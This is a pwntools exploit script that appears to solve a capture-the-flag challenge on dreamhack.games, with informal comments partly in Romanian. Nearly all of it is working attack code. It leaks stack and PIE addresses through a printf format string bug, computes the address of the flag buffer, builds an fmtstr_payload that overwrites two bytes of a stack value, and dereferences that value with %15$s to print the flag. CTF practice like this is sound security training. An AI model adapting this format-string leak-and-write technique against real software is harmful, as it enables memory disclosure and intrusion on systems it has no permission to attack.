from pwn import *
import time
elf =  ELF("./chall")

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:16387'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
#4060 flag_buf
#printf vuln
#full relro

#leak stack, leak pie, write on the stack that val
#%s will dereference it. lol

start = 6

#0x7fffffffd910 e lit prima val din stack cu inputul nostru
#%n$p
#modify that
#%n$s will dereference and print za flag

#cause flag read in 0x4060
p.recvuntil(b"> ")
p.sendline(b"1")

#receive leaks for PIE + stack
p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b"> ")
p.sendline(b"2")
sleep(1)
p.sendline(b"%p.%19$p")
stack_leak, pie_leak = p.recvline().strip().split(b".")
stack_leak = int(stack_leak, 16)
pie_leak = int(pie_leak, 16)

pie = pie_leak - 0x143e
flag = pie + 0x4060

stack_15 = stack_leak + 0x48

print(f"flagg at {hex(flag)} n stack_15 at {hex(stack_15)}")

writes = {
stack_15: p16(flag%0x10000)
}

payload = fmtstr_payload(6, writes, write_size='short')
print(len(payload))
#uh oops payload too long for full overwrite
#so then we need another approach - modify a value that already has a pie leak, and overwrite only the 2 lower bytes
#the one i used for the leak at %19$p was rip XD
#i changed it to 15
#ok
p.recvuntil(b"> ")
p.sendline(b"2")
sleep(1)
p.send(payload)

p.recvuntil(b"> ")
p.sendline(b"2")
sleep(1)
p.sendline(b"%15$s")

p.interactive()
